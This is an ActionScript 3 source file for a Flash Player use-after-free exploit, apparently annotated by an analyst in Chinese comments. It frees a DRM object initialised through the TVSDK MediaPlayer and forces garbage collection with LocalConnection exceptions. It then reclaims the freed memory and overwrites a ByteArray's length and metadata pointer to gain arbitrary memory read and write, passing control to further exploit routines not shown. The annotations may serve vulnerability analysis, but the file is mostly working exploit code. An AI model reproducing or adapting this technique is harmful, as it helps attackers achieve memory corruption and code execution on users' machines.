package
{
   import com.adobe.tvsdk.mediacore.MediaPlayer;
   import com.adobe.tvsdk.mediacore.PSDK;
   import com.adobe.tvsdk.mediacore.PSDKEventDispatcher;
   import flash.events.TimerEvent;
   import flash.net.LocalConnection;
   import flash.utils.Endian;
   import flash.utils.Timer;
   
   public class UAFGenerator
   {
       
      
      var DRM_obj_1:DRM_obj;
      
      var media_player:MediaPlayer;
      
      var DRM_obj_2:DRM_obj;
      
      var var_17:Mem_Arr;
      
      var Timer:Timer;
      
      var start_addr:uint;
      
      var var_1:MainExp;
      
      public function UAFGenerator(param1:MainExp)
      {
         var param1:MainExp = param1;
         ;
         super();
         this.var_1 = param1;
         this.method_2();
         try
         {
            new LocalConnection().connect("foo");//  LocalConnection().connect会主动调用gc释放没有的引用的内存DRM_obj_1
            new LocalConnection().connect("foo");// 第二次的LocalConnection().connect调用会产生异常，异常处理过程中又会new一个DRM_obj的对象赋值给DRM_obj_2。  
         }
         catch(e:Error)
         {
            this.DRM_obj_2 = new DRM_obj();   //代码注释掉将会触发空指针(DRM_obj_1)访问崩溃。
         }
         this.Timer = new Timer(100,1000);
         this.Timer.addEventListener("timer",this.method_1);
         this.Timer.start();
      }
      
      public function method_2() : void
      {
         var sdk:PSDK = PSDK.pSDK;//sdk
         var dispatch:PSDKEventDispatcher = sdk.createDispatcher();//dispatch
         this.media_player = sdk.createMediaPlayer(dispatch);
         this.DRM_obj_1 = new DRM_obj();
         this.media_player.drmManager.initialize(this.DRM_obj_1); //通过DRMManager初始化DRM object 
         this.DRM_obj_1 = null;//为了GC内存
      }
      
      public function method_1(param1:TimerEvent) : void
      {
         if(this.DRM_obj_2.a1 != 4369)  //0x1111 通过计时器来检查DRM object的a1是不是被修改了，如果已经被修改，则去做利用的部分.
         {
            this.Timer.stop();     
            this.flash25();
         }
      }
      
      public function flash24() : void
      {
      }
      
      public function flash25() : void //思路是ByteArray占位，以及修改ByteArray的Length，获取全地址访问的权限。
      {  // allocate ByteArray object to place freed memory
         var sdk:int = 0;
         var dispatch:uint = null;
         this.var_17 = new Mem_Arr();  //var_17是个ByteArray对象，通过修改ByteArray对象的Length可以完成任意内存读写，该处的漏洞利用技巧和hacking team的flash exploit技巧类似，相关代码已经开源就不再详述。
         this.var_17.length = 512;
         if(this.DRM_obj_2.a14 != 0)
         {// 修改 length of ByteArray
            sdk = 0;
            while(sdk < 5)
            {// 将bytearray对象的元数据复制到数据区域
               this.DRM_obj_2.a32 = this.DRM_obj_2.a14 + 8 * sdk + 7;
               this.var_17.flash26(sdk * 2 + 1,this.var_17.flash25());
               sdk++;
            }
            this.var_17.a11 = 0;
            this.start_addr = uint(uint(this.DRM_obj_2.a14));
            this.DRM_obj_2.a14 = this.DRM_obj_2.a31 + 19 * 4 + 16 - 1;  // modify meta pointer to bytearray data area
            dispatch = this.DRM_obj_2.a22 ^ this.DRM_obj_2.a26;
            this.DRM_obj_2.a22 = 0;
            this.DRM_obj_2.a23 = -1;  // modify lenght/capability of bytearray
            this.DRM_obj_2.a24 = -1;  // modify lenght/capability of bytearray
            this.DRM_obj_2.a26 = this.DRM_obj_2.a22 ^ dispatch;
            this.DRM_obj_2.a27 = this.DRM_obj_2.a23 ^ dispatch;
            this.DRM_obj_2.a28 = this.DRM_obj_2.a24 ^ dispatch;
            this.DRM_obj_2.a29 = this.DRM_obj_2.a25 ^ dispatch;
            this.var_17.endian = Endian.LITTLE_ENDIAN;
            Primit.flash20(this.var_17,this.DRM_obj_2);
            this.DRM_obj_2.a14 = this.start_addr;  // recover meta pointer
            return;
         }
         this.var_1.flash21();
      }
   }
}
